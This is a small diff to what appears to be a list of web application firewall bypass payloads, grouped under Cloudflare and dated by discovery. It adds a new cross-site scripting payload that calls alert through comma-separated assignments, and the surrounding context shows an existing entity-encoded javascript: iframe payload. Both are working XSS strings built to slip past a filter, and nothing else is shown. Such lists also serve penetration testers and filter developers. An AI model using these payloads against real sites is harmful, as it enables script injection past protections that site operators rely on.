@@ -5,6 +5,9 @@ The payloads are headed by the date of discovery of the bypass.
 ### Cloudflare
 
 ```csharp
+//06-10-2021:
+";(a=alert,b=1,a(b))
+
 //17-08-2021:
 "<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >"
 
